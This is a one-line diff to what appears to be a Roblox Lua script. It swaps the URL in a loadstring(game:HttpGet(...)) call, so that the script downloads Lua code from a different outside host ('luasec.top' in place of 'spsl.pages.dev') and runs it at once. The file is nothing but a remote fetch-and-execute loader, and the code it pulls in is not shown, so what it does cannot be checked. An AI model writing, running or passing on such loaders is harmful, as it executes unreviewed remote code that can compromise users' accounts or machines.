@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://spsl.pages.dev/l/a946d94951cdc913.lua"))()
+loadstring(game:HttpGet("https://luasec.top/files/v4/loaders/aec8d1c5570f72883ad649ba8bb80439.lua"))()
